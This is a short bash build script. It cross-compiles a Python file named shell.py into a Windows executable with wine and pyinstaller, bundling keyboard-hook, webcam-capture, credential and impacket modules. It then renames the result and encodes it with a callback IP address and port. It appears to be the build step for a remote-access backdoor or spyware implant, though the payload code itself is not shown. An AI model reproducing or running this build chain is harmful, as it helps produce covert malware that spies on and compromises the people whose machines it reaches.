#!/bin/bash

wine pyinstaller --onefile --hidden-import=ctypes --hidden-import=pyhook --hidden-import=vidcap --hidden-import=getpass --hidden-import=win32net --hidden-import=sys --hidden-import=impacket shell.py 
mv dist/shell.exe template/template.exe
./encode.py 192.168.1.78 8080 shell.exe
